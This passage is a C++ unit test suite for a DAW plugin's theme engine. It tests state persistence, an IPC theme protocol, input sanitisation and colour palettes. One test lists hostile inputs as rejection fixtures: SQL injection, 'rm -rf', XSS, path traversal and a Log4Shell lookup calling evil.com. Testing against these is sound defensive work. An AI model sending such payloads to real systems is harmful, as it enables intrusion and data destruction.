#include <algorithm>
#include <atomic>
#include <cctype>
#include <chrono>
#include <map>
#include <memory>
#include <sstream>
#include <string>
#include <string_view>
#include <thread>
#include <vector>

#include <nlohmann/json.hpp>
#include "../framework/MockHostActions.h"
#include "../framework/TestRunner.h"
#include <reals/config/Config.h>

namespace reals::test {

using json = nlohmann::json;

namespace {

constexpr const char* kExtStateSection = "REALSLAB";
constexpr const char* kExtStateKey = "theme";
constexpr const char* kDefaultTheme = "dark-studio";
constexpr const char* kThemeIpcPrefix = "THEME_CHANGED:";

const std::vector<std::string> kValidThemes = {
    "dark-studio",
    "pastel-pink",
    "cyberpunk"
};

bool isValidTheme(std::string_view name) {
    for (const auto& t : kValidThemes) {
        if (t == name) return true;
    }
    return false;
}

std::string trimWhitespace(std::string_view s) {
    size_t start = 0;
    while (start < s.size() && (std::isspace(static_cast<unsigned char>(s[start])) || s[start] == '\0')) {
        ++start;
    }
    size_t end = s.size();
    while (end > start && (std::isspace(static_cast<unsigned char>(s[end - 1])) || s[end - 1] == '\0')) {
        --end;
    }
    return std::string(s.substr(start, end - start));
}

std::string toLower(std::string_view s) {
    std::string out(s);
    for (char& c : out) {
        c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
    }
    return out;
}

std::string sanitizeTheme(std::string_view input) {
    std::string trimmed = trimWhitespace(input);
    std::string lower = toLower(trimmed);
    if (isValidTheme(lower)) {
        return lower;
    }
    return kDefaultTheme;
}

bool parseThemeIpcMessage(std::string_view msg, std::string& outTheme) {
    const std::string_view prefix = kThemeIpcPrefix;
    if (msg.rfind(prefix, 0) != 0) {
        return false;
    }
    std::string rawPayload(msg.substr(prefix.length()));
    outTheme = sanitizeTheme(rawPayload);
    return true;
}

std::string formatThemeScript(std::string_view theme) {
    std::string safeTheme = sanitizeTheme(theme);
    return "window.themeManager && window.themeManager.applyTheme('" + safeTheme + "', false);";
}

bool isValidCssColor(std::string_view c) {
    if (c.empty()) return false;
    if (c[0] == '#') {
        if (c.size() != 4 && c.size() != 7 && c.size() != 9) return false;
        for (size_t i = 1; i < c.size(); ++i) {
            if (!std::isxdigit(static_cast<unsigned char>(c[i]))) return false;
        }
        return true;
    }
    if (c.rfind("rgb(", 0) == 0 || c.rfind("rgba(", 0) == 0) {
        return c.back() == ')';
    }
    return false;
}

struct ThemePaletteTokens {
    std::string bgRoot;
    std::string bgApp;
    std::string bgSidebar;
    std::string bgPanel;
    std::string bgCard;
    std::string bgCardHover;
    std::string bgInput;
    std::string bgElevated;
    std::string bgNavActive;

    std::string borderSubtle;
    std::string borderDefault;
    std::string borderStrong;
    std::string borderCard;
    std::string borderInput;

    std::string textPrimary;
    std::string textSecondary;
    std::string textTertiary;
    std::string textDisabled;
    std::string textIcon;

    std::string accent;
    std::string accentHover;
    std::string accentActive;
    std::string accentSoft;
    std::string accentBorder;
    std::string accentFocus;

    std::string waveformBg;
    std::string waveformFill;
    std::string waveformFillActive;
    std::string waveformCenterline;
    std::string waveformCursor;
    std::string waveformIdle;

    std::string meterBg;
    std::string meterGrad0;
    std::string meterGradMid;
    std::string meterGradWarn;
    std::string meterGradClip;

    std::string pianoRollBg;
    std::string pianoRollGrid;
    std::string pianoRollNoteGrad0;
    std::string pianoRollNoteGrad1;
    std::string pianoRollActiveGrad0;
    std::string pianoRollActiveGrad1;
    std::string pianoRollPlayhead;

    std::string pianoPopBg;
    std::string pianoPopBorder;
    std::string pianoKbBg;
    std::string pianoKeyWhiteBg;
    std::string pianoKeyWhiteHover;
    std::string pianoKeyWhiteTx;
    std::string pianoKeyBlackBg;
    std::string pianoKeyBlackHover;
    std::string pianoKeyBlackTx;
    std::string pianoKeyActiveBg;
    std::string pianoKeyActiveTx;
    std::string pianoKeyRootMark;

    [[nodiscard]] std::vector<std::pair<std::string, std::string>> allTokens() const {
        return {
            {"--bg-root", bgRoot}, {"--bg-app", bgApp}, {"--bg-sidebar", bgSidebar},
            {"--bg-panel", bgPanel}, {"--bg-card", bgCard}, {"--bg-card-hover", bgCardHover},
            {"--bg-input", bgInput}, {"--bg-elevated", bgElevated}, {"--bg-nav-active", bgNavActive},
            {"--border-subtle", borderSubtle}, {"--border-default", borderDefault},
            {"--border-strong", borderStrong}, {"--border-card", borderCard}, {"--border-input", borderInput},
            {"--text-primary", textPrimary}, {"--text-secondary", textSecondary},
            {"--text-tertiary", textTertiary}, {"--text-disabled", textDisabled}, {"--text-icon", textIcon},
            {"--accent", accent}, {"--accent-hover", accentHover}, {"--accent-active", accentActive},
            {"--accent-soft", accentSoft}, {"--accent-border", accentBorder}, {"--accent-focus", accentFocus},
            {"--waveform-bg", waveformBg}, {"--waveform-fill", waveformFill},
            {"--waveform-fill-active", waveformFillActive}, {"--waveform-centerline", waveformCenterline},
            {"--waveform-cursor", waveformCursor}, {"--waveform-idle", waveformIdle},
            {"--meter-bg", meterBg}, {"--meter-grad-0", meterGrad0}, {"--meter-grad-mid", meterGradMid},
            {"--meter-grad-warn", meterGradWarn}, {"--meter-grad-clip", meterGradClip},
            {"--piano-roll-bg", pianoRollBg}, {"--piano-roll-grid", pianoRollGrid},
            {"--piano-roll-note-grad-0", pianoRollNoteGrad0}, {"--piano-roll-note-grad-1", pianoRollNoteGrad1},
            {"--piano-roll-active-grad-0", pianoRollActiveGrad0}, {"--piano-roll-active-grad-1", pianoRollActiveGrad1},
            {"--piano-roll-playhead", pianoRollPlayhead},
            {"--piano-pop-bg", pianoPopBg}, {"--piano-pop-border", pianoPopBorder}, {"--piano-kb-bg", pianoKbBg},
            {"--piano-key-white-bg", pianoKeyWhiteBg}, {"--piano-key-white-hover", pianoKeyWhiteHover},
            {"--piano-key-white-tx", pianoKeyWhiteTx}, {"--piano-key-black-bg", pianoKeyBlackBg},
            {"--piano-key-black-hover", pianoKeyBlackHover}, {"--piano-key-black-tx", pianoKeyBlackTx},
            {"--piano-key-active-bg", pianoKeyActiveBg}, {"--piano-key-active-tx", pianoKeyActiveTx},
            {"--piano-key-root-mark", pianoKeyRootMark}
        };
    }
};

ThemePaletteTokens getDarkStudioTokens() {
    ThemePaletteTokens t;
    t.bgRoot = "#090A0C"; t.bgApp = "#0D0E11"; t.bgSidebar = "#101114";
    t.bgPanel = "#121316"; t.bgCard = "#15171A"; t.bgCardHover = "#191B1F";
    t.bgInput = "#0D0F12"; t.bgElevated = "#1A1C20"; t.bgNavActive = "#17191C";

    t.borderSubtle = "#24262B"; t.borderDefault = "#2C2F35"; t.borderStrong = "#363941";
    t.borderCard = "#24272C"; t.borderInput = "#292C31";

    t.textPrimary = "#F2F3F5"; t.textSecondary = "#A3A6AD"; t.textTertiary = "#737780";
    t.textDisabled = "#6A6D75"; t.textIcon = "#858991";

    t.accent = "#FF6B2C"; t.accentHover = "#FF7A3D"; t.accentActive = "#E9571D";
    t.accentSoft = "rgba(255, 107, 44, 0.12)"; t.accentBorder = "rgba(255, 107, 44, 0.35)";
    t.accentFocus = "rgba(255, 107, 44, 0.55)";

    t.waveformBg = "#0B0E14"; t.waveformFill = "rgba(255, 255, 255, 0.12)";
    t.waveformFillActive = "rgba(56, 189, 248, 0.85)"; t.waveformCenterline = "rgba(255, 255, 255, 0.05)";
    t.waveformCursor = "rgba(255, 255, 255, 0.90)"; t.waveformIdle = "rgba(255, 255, 255, 0.08)";

    t.meterBg = "#0B0E14"; t.meterGrad0 = "#2EA0D6"; t.meterGradMid = "#22C55E";
    t.meterGradWarn = "#EAB308"; t.meterGradClip = "#EF4444";

    t.pianoRollBg = "#0B0E14"; t.pianoRollGrid = "rgba(255, 255, 255, 0.04)";
    t.pianoRollNoteGrad0 = "#38BDF8"; t.pianoRollNoteGrad1 = "#0284C7";
    t.pianoRollActiveGrad0 = "#FFFFFF"; t.pianoRollActiveGrad1 = "#38BDF8";
    t.pianoRollPlayhead = "rgba(255, 255, 255, 0.85)";

    t.pianoPopBg = "#12151C"; t.pianoPopBorder = "rgba(255, 255, 255, 0.10)";
    t.pianoKbBg = "#0A0B0D"; t.pianoKeyWhiteBg = "#E2E4E9"; t.pianoKeyWhiteHover = "#FFFFFF";
    t.pianoKeyWhiteTx = "#1E2024"; t.pianoKeyBlackBg = "#181A1F"; t.pianoKeyBlackHover = "#2D3038";
    t.pianoKeyBlackTx = "#8F939B"; t.pianoKeyActiveBg = "#38BDF8"; t.pianoKeyActiveTx = "#0A0D14";
    t.pianoKeyRootMark = "#F59E0B";
    return t;
}

ThemePaletteTokens getPastelPinkTokens() {
    ThemePaletteTokens t;
    t.bgRoot = "#FFF5F7"; t.bgApp = "#FFF0F5"; t.bgSidebar = "#FFE8EE";
    t.bgPanel = "#FFE2EA"; t.bgCard = "#FFFFFF"; t.bgCardHover = "#FFF9FA";
    t.bgInput = "#FFFFFF"; t.bgElevated = "#FFD8E3"; t.bgNavActive = "#FFD4E1";

    t.borderSubtle = "#F3C4D2"; t.borderDefault = "#EAAEC0"; t.borderStrong = "#DF98AD";
    t.borderCard = "#F0BCCB"; t.borderInput = "#EAAEC0";

    t.textPrimary = "#2D1420"; t.textSecondary = "#6E3D52"; t.textTertiary = "#9C657C";
    t.textDisabled = "#B88AA0"; t.textIcon = "#8F546E";

    t.accent = "#E75480"; t.accentHover = "#FF6699"; t.accentActive = "#D13E6B";
    t.accentSoft = "rgba(231, 84, 128, 0.14)"; t.accentBorder = "rgba(231, 84, 128, 0.40)";
    t.accentFocus = "rgba(231, 84, 128, 0.55)";

    t.waveformBg = "#FFE4EC"; t.waveformFill = "rgba(231, 84, 128, 0.28)";
    t.waveformFillActive = "#E75480"; t.waveformCenterline = "rgba(231, 84, 128, 0.20)";
    t.waveformCursor = "#C2185B"; t.waveformIdle = "rgba(231, 84, 128, 0.15)";

    t.meterBg = "#FFE4EC"; t.meterGrad0 = "#FF69B4"; t.meterGradMid = "#FF1493";
    t.meterGradWarn = "#FF8C00"; t.meterGradClip = "#E53935";

    t.pianoRollBg = "#FFE4EC"; t.pianoRollGrid = "rgba(231, 84, 128, 0.12)";
    t.pianoRollNoteGrad0 = "#FF85A2"; t.pianoRollNoteGrad1 = "#E75480";
    t.pianoRollActiveGrad0 = "#FFFFFF"; t.pianoRollActiveGrad1 = "#FF4081";
    t.pianoRollPlayhead = "#C2185B";

    t.pianoPopBg = "#FFFFFF"; t.pianoPopBorder = "#F3C4D2"; t.pianoKbBg = "#FFE4EC";
    t.pianoKeyWhiteBg = "#FFFFFF"; t.pianoKeyWhiteHover = "#FFF0F5"; t.pianoKeyWhiteTx = "#2D1420";
    t.pianoKeyBlackBg = "#6E3D52"; t.pianoKeyBlackHover = "#542B3C"; t.pianoKeyBlackTx = "#FFE4EC";
    t.pianoKeyActiveBg = "#E75480"; t.pianoKeyActiveTx = "#FFFFFF"; t.pianoKeyRootMark = "#FF6F00";
    return t;
}

ThemePaletteTokens getCyberpunkTokens() {
    ThemePaletteTokens t;
    t.bgRoot = "#040408"; t.bgApp = "#080811"; t.bgSidebar = "#0C0C18";
    t.bgPanel = "#101020"; t.bgCard = "#141428"; t.bgCardHover = "#1A1A34";
    t.bgInput = "#080812"; t.bgElevated = "#1C1C3A"; t.bgNavActive = "#202042";

    t.borderSubtle = "#242446"; t.borderDefault = "#343464"; t.borderStrong = "#00FFFF";
    t.borderCard = "#282850"; t.borderInput = "#343464";

    t.textPrimary = "#00FFFF"; t.textSecondary = "#FF007F"; t.textTertiary = "#A6A6D0";
    t.textDisabled = "#5E5E8A"; t.textIcon = "#00FFFF";

    t.accent = "#FFE600"; t.accentHover = "#FFF04D"; t.accentActive = "#E6CE00";
    t.accentSoft = "rgba(255, 230, 0, 0.15)"; t.accentBorder = "rgba(255, 230, 0, 0.45)";
    t.accentFocus = "rgba(255, 230, 0, 0.65)";

    t.waveformBg = "#05050C"; t.waveformFill = "rgba(0, 255, 255, 0.22)";
    t.waveformFillActive = "#FF007F"; t.waveformCenterline = "rgba(0, 255, 255, 0.18)";
    t.waveformCursor = "#FFE600"; t.waveformIdle = "rgba(0, 255, 255, 0.10)";

    t.meterBg = "#05050C"; t.meterGrad0 = "#00FFFF"; t.meterGradMid = "#00FF66";
    t.meterGradWarn = "#FFE600"; t.meterGradClip = "#FF0055";

    t.pianoRollBg = "#05050C"; t.pianoRollGrid = "rgba(0, 255, 255, 0.10)";
    t.pianoRollNoteGrad0 = "#00FFFF"; t.pianoRollNoteGrad1 = "#0066FF";
    t.pianoRollActiveGrad0 = "#FFE600"; t.pianoRollActiveGrad1 = "#FF007F";
    t.pianoRollPlayhead = "#FFE600";

    t.pianoPopBg = "#0C0C1A"; t.pianoPopBorder = "#FF007F"; t.pianoKbBg = "#05050C";
    t.pianoKeyWhiteBg = "#00FFFF"; t.pianoKeyWhiteHover = "#80FFFF"; t.pianoKeyWhiteTx = "#040408";
    t.pianoKeyBlackBg = "#141428"; t.pianoKeyBlackHover = "#222244"; t.pianoKeyBlackTx = "#FF007F";
    t.pianoKeyActiveBg = "#FF007F"; t.pianoKeyActiveTx = "#FFFFFF"; t.pianoKeyRootMark = "#FFE600";
    return t;
}

} // anonymous namespace

// ============================================================================
// TIER 1: FEATURE COVERAGE (Core Functional Matrix)
// ============================================================================

// Feature 1: SetExtState Persistence
TEST(ThemeEngine, T1_F1_01_SetExtState_DefaultDarkStudio) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "dark-studio", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "dark-studio");
    EXPECT_TRUE(host.isExtStatePersisted(kExtStateSection, kExtStateKey));
}

TEST(ThemeEngine, T1_F1_02_SetExtState_PastelPink) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "pastel-pink", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "pastel-pink");
    EXPECT_TRUE(host.isExtStatePersisted(kExtStateSection, kExtStateKey));
}

TEST(ThemeEngine, T1_F1_03_SetExtState_Cyberpunk) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "cyberpunk", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "cyberpunk");
    EXPECT_TRUE(host.isExtStatePersisted(kExtStateSection, kExtStateKey));
}

TEST(ThemeEngine, T1_F1_04_SetExtState_FlagPersistenceEnabled) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "cyberpunk", true);
    EXPECT_TRUE(host.isExtStatePersisted(kExtStateSection, kExtStateKey));

    host.setExtState(kExtStateSection, "temp_key", "temp_value", false);
    EXPECT_FALSE(host.isExtStatePersisted(kExtStateSection, "temp_key"));
}

TEST(ThemeEngine, T1_F1_05_SetExtState_SequentialStateUpdates) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "dark-studio", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "dark-studio");

    host.setExtState(kExtStateSection, kExtStateKey, "pastel-pink", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "pastel-pink");

    host.setExtState(kExtStateSection, kExtStateKey, "cyberpunk", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "cyberpunk");
}

// Feature 2: GetExtState Retrieval
TEST(ThemeEngine, T1_F2_01_GetExtState_EmptyInitialState) {
    MockHostActions host;
    EXPECT_TRUE(host.getExtState(kExtStateSection, kExtStateKey).empty());
    EXPECT_FALSE(host.hasExtState(kExtStateSection, kExtStateKey));
}

TEST(ThemeEngine, T1_F2_02_GetExtState_ExistingDarkStudio) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "dark-studio", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "dark-studio");
    EXPECT_TRUE(host.hasExtState(kExtStateSection, kExtStateKey));
}

TEST(ThemeEngine, T1_F2_03_GetExtState_ExistingPastelPink) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "pastel-pink", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "pastel-pink");
    EXPECT_TRUE(host.hasExtState(kExtStateSection, kExtStateKey));
}

TEST(ThemeEngine, T1_F2_04_GetExtState_ExistingCyberpunk) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "cyberpunk", true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "cyberpunk");
    EXPECT_TRUE(host.hasExtState(kExtStateSection, kExtStateKey));
}

TEST(ThemeEngine, T1_F2_05_GetExtState_SectionKeyIsolation) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "cyberpunk", true);
    host.setExtState("OTHER_SECTION", kExtStateKey, "other_theme", true);
    host.setExtState(kExtStateSection, "other_key", "value", true);

    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "cyberpunk");
    EXPECT_EQ(host.getExtState("OTHER_SECTION", kExtStateKey), "other_theme");
    EXPECT_EQ(host.getExtState(kExtStateSection, "other_key"), "value");
    EXPECT_TRUE(host.getExtState(kExtStateSection, "non_existent_key").empty());
}

// Feature 3: Theme Switching Protocol (THEME_CHANGED:<name>)
TEST(ThemeEngine, T1_F3_01_Protocol_PrefixValidation) {
    std::string outTheme;
    EXPECT_TRUE(parseThemeIpcMessage("THEME_CHANGED:dark-studio", outTheme));
    EXPECT_EQ(outTheme, "dark-studio");

    EXPECT_FALSE(parseThemeIpcMessage("INVALID_CMD:dark-studio", outTheme));
    EXPECT_FALSE(parseThemeIpcMessage("theme_changed:dark-studio", outTheme));
    EXPECT_FALSE(parseThemeIpcMessage("", outTheme));
}

TEST(ThemeEngine, T1_F3_02_Protocol_ExtractDarkStudio) {
    std::string outTheme;
    EXPECT_TRUE(parseThemeIpcMessage("THEME_CHANGED:dark-studio", outTheme));
    EXPECT_EQ(outTheme, "dark-studio");
}

TEST(ThemeEngine, T1_F3_03_Protocol_ExtractPastelPink) {
    std::string outTheme;
    EXPECT_TRUE(parseThemeIpcMessage("THEME_CHANGED:pastel-pink", outTheme));
    EXPECT_EQ(outTheme, "pastel-pink");
}

TEST(ThemeEngine, T1_F3_04_Protocol_ExtractCyberpunk) {
    std::string outTheme;
    EXPECT_TRUE(parseThemeIpcMessage("THEME_CHANGED:cyberpunk", outTheme));
    EXPECT_EQ(outTheme, "cyberpunk");
}

TEST(ThemeEngine, T1_F3_05_Protocol_RejectInvalidPrefix) {
    std::string outTheme;
    EXPECT_FALSE(parseThemeIpcMessage("THEME:cyberpunk", outTheme));
    EXPECT_FALSE(parseThemeIpcMessage("CHANGE_THEME:pastel-pink", outTheme));
    EXPECT_FALSE(parseThemeIpcMessage("THEME_CHANGED_pastel-pink", outTheme));
}

// Feature 4: Fallback Handling
TEST(ThemeEngine, T1_F4_01_Fallback_EmptyStringToDefault) {
    EXPECT_EQ(sanitizeTheme(""), "dark-studio");
    std::string outTheme;
    EXPECT_TRUE(parseThemeIpcMessage("THEME_CHANGED:", outTheme));
    EXPECT_EQ(outTheme, "dark-studio");
}

TEST(ThemeEngine, T1_F4_02_Fallback_UnknownThemeNameToDefault) {
    EXPECT_EQ(sanitizeTheme("solarized-light"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("nord-theme"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("dracula"), "dark-studio");
}

TEST(ThemeEngine, T1_F4_03_Fallback_GarbageNumericStringToDefault) {
    EXPECT_EQ(sanitizeTheme("1234567890"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("-1"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("0"), "dark-studio");
}

TEST(ThemeEngine, T1_F4_04_Fallback_SpecialCharGarbageToDefault) {
    EXPECT_EQ(sanitizeTheme("!@#$%^&*()_+"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("`~{}[]|\\:;\"'<>,.?/"), "dark-studio");
}

TEST(ThemeEngine, T1_F4_05_Fallback_ValidThemesPreserved) {
    EXPECT_EQ(sanitizeTheme("dark-studio"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("pastel-pink"), "pastel-pink");
    EXPECT_EQ(sanitizeTheme("cyberpunk"), "cyberpunk");
}

// Feature 5: Design Token Validation
TEST(ThemeEngine, T1_F5_01_Tokens_DarkStudioCompletePalette) {
    auto tokens = getDarkStudioTokens();
    auto all = tokens.allTokens();
    EXPECT_GE(all.size(), 40u);
    for (const auto& [name, val] : all) {
        EXPECT_FALSE(name.empty());
        EXPECT_FALSE(val.empty());
        EXPECT_TRUE(isValidCssColor(val));
    }
}

TEST(ThemeEngine, T1_F5_02_Tokens_PastelPinkCompletePalette) {
    auto tokens = getPastelPinkTokens();
    auto all = tokens.allTokens();
    EXPECT_GE(all.size(), 40u);
    for (const auto& [name, val] : all) {
        EXPECT_FALSE(name.empty());
        EXPECT_FALSE(val.empty());
        EXPECT_TRUE(isValidCssColor(val));
    }
}

TEST(ThemeEngine, T1_F5_03_Tokens_CyberpunkCompletePalette) {
    auto tokens = getCyberpunkTokens();
    auto all = tokens.allTokens();
    EXPECT_GE(all.size(), 40u);
    for (const auto& [name, val] : all) {
        EXPECT_FALSE(name.empty());
        EXPECT_FALSE(val.empty());
        EXPECT_TRUE(isValidCssColor(val));
    }
}

TEST(ThemeEngine, T1_F5_04_Tokens_WaveformColorContrast) {
    auto dark = getDarkStudioTokens();
    EXPECT_NE(dark.waveformBg, dark.waveformFillActive);

    auto pink = getPastelPinkTokens();
    EXPECT_NE(pink.waveformBg, pink.waveformFillActive);

    auto cyber = getCyberpunkTokens();
    EXPECT_NE(cyber.waveformBg, cyber.waveformFillActive);
}

TEST(ThemeEngine, T1_F5_05_Tokens_HexAndRgbaColorFormatValidation) {
    auto dark = getDarkStudioTokens();
    EXPECT_EQ(dark.bgRoot, "#090A0C");
    EXPECT_EQ(dark.accent, "#FF6B2C");

    auto pink = getPastelPinkTokens();
    EXPECT_EQ(pink.bgRoot, "#FFF5F7");
    EXPECT_EQ(pink.accent, "#E75480");

    auto cyber = getCyberpunkTokens();
    EXPECT_EQ(cyber.bgRoot, "#040408");
    EXPECT_EQ(cyber.textPrimary, "#00FFFF");
    EXPECT_EQ(cyber.accent, "#FFE600");
}

// ============================================================================
// TIER 2: BOUNDARY & CORNER CASES (Adversarial & Edge Cases)
// ============================================================================

TEST(ThemeEngine, T2_B01_EmptyThemeString) {
    MockHostActions host;
    host.setExtState(kExtStateSection, kExtStateKey, "", true);
    std::string retrieved = host.getExtState(kExtStateSection, kExtStateKey);
    EXPECT_EQ(sanitizeTheme(retrieved), "dark-studio");
}

TEST(ThemeEngine, T2_B02_OversizedThemeString_4KB) {
    std::string hugeString(4096, 'A');
    std::string sanitized = sanitizeTheme(hugeString);
    EXPECT_EQ(sanitized, "dark-studio");

    std::string hugeMsg = std::string(kThemeIpcPrefix) + hugeString;
    std::string outTheme;
    EXPECT_TRUE(parseThemeIpcMessage(hugeMsg, outTheme));
    EXPECT_EQ(outTheme, "dark-studio");
}

TEST(ThemeEngine, T2_B03_SpecialCharactersAndControlBytes) {
    std::string controlString = "pastel-pink\0\r\n\t";
    std::string sanitized = sanitizeTheme(controlString);
    EXPECT_EQ(sanitized, "pastel-pink");

    std::string badString = "\x01\x02\x03\x04\x05\x06";
    EXPECT_EQ(sanitizeTheme(badString), "dark-studio");
}

TEST(ThemeEngine, T2_B04_SqlAndJsonInjectionPayloads) {
    std::vector<std::string> injections = {
        "' OR '1'='1",
        "\"; DROP TABLE themes; --",
        "{\"cmd\":\"exec\",\"payload\":\"rm -rf\"}",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
    };

    for (const auto& payload : injections) {
        EXPECT_EQ(sanitizeTheme(payload), "dark-studio");
        std::string out;
        std::string msg = std::string(kThemeIpcPrefix) + payload;
        EXPECT_TRUE(parseThemeIpcMessage(msg, out));
        EXPECT_EQ(out, "dark-studio");
    }
}

TEST(ThemeEngine, T2_B05_WhitespaceLeadingTrailing) {
    EXPECT_EQ(sanitizeTheme("   pastel-pink   "), "pastel-pink");
    EXPECT_EQ(sanitizeTheme("\t\tcyberpunk\n\n"), "cyberpunk");
    EXPECT_EQ(sanitizeTheme(" \r\n dark-studio \t "), "dark-studio");
}

TEST(ThemeEngine, T2_B06_CaseSensitivityAndNormalization) {
    EXPECT_EQ(sanitizeTheme("DARK-STUDIO"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("Pastel-Pink"), "pastel-pink");
    EXPECT_EQ(sanitizeTheme("cYbErPuNk"), "cyberpunk");
    EXPECT_EQ(sanitizeTheme("CYBERPUNK"), "cyberpunk");
}

TEST(ThemeEngine, T2_B07_UnicodeAndEmojiThemeNames) {
    EXPECT_EQ(sanitizeTheme("🌸pastel-pink🌸"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("テーマ"), "dark-studio");
    EXPECT_EQ(sanitizeTheme("тема_cyberpunk"), "dark-studio");
}

// ============================================================================
// TIER 3: CROSS-FEATURE COMBINATIONS
// ============================================================================

TEST(ThemeEngine, T3_C01_RapidThemeSwitchingOscillation) {
    MockHostActions host;
    const std::vector<std::string> sequence = {
        "dark-studio", "pastel-pink", "cyberpunk"
    };

    for (int cycle = 0; cycle < 100; ++cycle) {
        std::string theme = sequence[static_cast<size_t>(cycle % 3)];
        std::string script = formatThemeScript(theme);
        EXPECT_NE(script.find(theme), std::string::npos);

        host.setExtState(kExtStateSection, kExtStateKey, theme, true);
        EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), theme);
    }
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "dark-studio");
}

TEST(ThemeEngine, T3_C02_ExtStateSuccessiveOverwrites) {
    MockHostActions host;
    for (int i = 0; i < 50; ++i) {
        std::string val = (i % 2 == 0) ? "pastel-pink" : "cyberpunk";
        host.setExtState(kExtStateSection, kExtStateKey, val, true);
        EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), val);
        EXPECT_TRUE(host.isExtStatePersisted(kExtStateSection, kExtStateKey));
    }
}

TEST(ThemeEngine, T3_C03_IpcInterleavingWithAudioTransport) {
    BridgeTestHarness harness;

    // Interleave theme changes with bridge calls
    auto r1 = harness.call("audio.setVolume", {{"value", 0.75f}});
    EXPECT_TRUE(r1.value("ok", false));

    std::string theme1;
    EXPECT_TRUE(parseThemeIpcMessage("THEME_CHANGED:pastel-pink", theme1));
    harness.host().setExtState(kExtStateSection, kExtStateKey, theme1, true);

    auto r2 = harness.call("audio.setLoop", {{"value", true}});
    EXPECT_TRUE(r2.value("ok", false));

    std::string theme2;
    EXPECT_TRUE(parseThemeIpcMessage("THEME_CHANGED:cyberpunk", theme2));
    harness.host().setExtState(kExtStateSection, kExtStateKey, theme2, true);

    EXPECT_EQ(harness.host().getExtState(kExtStateSection, kExtStateKey), "cyberpunk");
}

TEST(ThemeEngine, T3_C04_ConcurrentThreadSafety) {
    MockHostActions host;
    std::atomic<bool> start{false};
    std::atomic<int> errors{0};

    auto reader = [&]() {
        while (!start.load()) {
            std::this_thread::yield();
        }
        for (int i = 0; i < 500; ++i) {
            std::string val = host.getExtState(kExtStateSection, kExtStateKey);
            if (!val.empty() && val != "dark-studio" && val != "pastel-pink" && val != "cyberpunk") {
                errors.fetch_add(1);
            }
        }
    };

    auto writer = [&](std::string theme) {
        while (!start.load()) {
            std::this_thread::yield();
        }
        for (int i = 0; i < 500; ++i) {
            host.setExtState(kExtStateSection, kExtStateKey, theme, true);
        }
    };

    std::thread t1(writer, "dark-studio");
    std::thread t2(writer, "pastel-pink");
    std::thread t3(writer, "cyberpunk");
    std::thread t4(reader);
    std::thread t5(reader);

    start.store(true);

    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();

    EXPECT_EQ(errors.load(), 0);
    std::string finalVal = host.getExtState(kExtStateSection, kExtStateKey);
    EXPECT_TRUE(isValidTheme(finalVal));
}

TEST(ThemeEngine, T3_C05_BidirectionalRoundTripSimulation) {
    MockHostActions host;
    // Step 1: JS sends THEME_CHANGED:pastel-pink
    std::string incomingMsg = "THEME_CHANGED:pastel-pink";
    std::string themeName;
    bool parsed = parseThemeIpcMessage(incomingMsg, themeName);
    EXPECT_TRUE(parsed);
    EXPECT_EQ(themeName, "pastel-pink");

    // Step 2: C++ writes to ExtState
    host.setExtState(kExtStateSection, kExtStateKey, themeName, true);
    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "pastel-pink");

    // Step 3: C++ broadcasts back to JS
    std::string outgoingScript = formatThemeScript(themeName);
    EXPECT_EQ(outgoingScript, "window.themeManager && window.themeManager.applyTheme('pastel-pink', false);");
}

// ============================================================================
// TIER 4: REAL-WORLD SCENARIOS (DAW Project & Lifecycle)
// ============================================================================

TEST(ThemeEngine, T4_R01_ReaperProjectLoadWithSavedTheme) {
    MockHostActions host;
    // Simulate reaper-extstate.ini containing saved cyberpunk theme
    host.setExtState(kExtStateSection, kExtStateKey, "cyberpunk", true);

    // Startup reading ExtState
    std::string storedTheme = host.getExtState(kExtStateSection, kExtStateKey);
    std::string activeTheme = sanitizeTheme(storedTheme);
    EXPECT_EQ(activeTheme, "cyberpunk");

    // Push to web view
    std::string bootstrapScript = formatThemeScript(activeTheme);
    EXPECT_EQ(bootstrapScript, "window.themeManager && window.themeManager.applyTheme('cyberpunk', false);");
}

TEST(ThemeEngine, T4_R02_LegacyThemeMigration) {
    MockHostActions host;
    // Legacy state has old deprecated theme name
    host.setExtState(kExtStateSection, kExtStateKey, "legacy-amber-v1", true);

    std::string rawTheme = host.getExtState(kExtStateSection, kExtStateKey);
    std::string migratedTheme = sanitizeTheme(rawTheme);

    // Should migrate cleanly to dark-studio
    EXPECT_EQ(migratedTheme, "dark-studio");
    host.setExtState(kExtStateSection, kExtStateKey, migratedTheme, true);
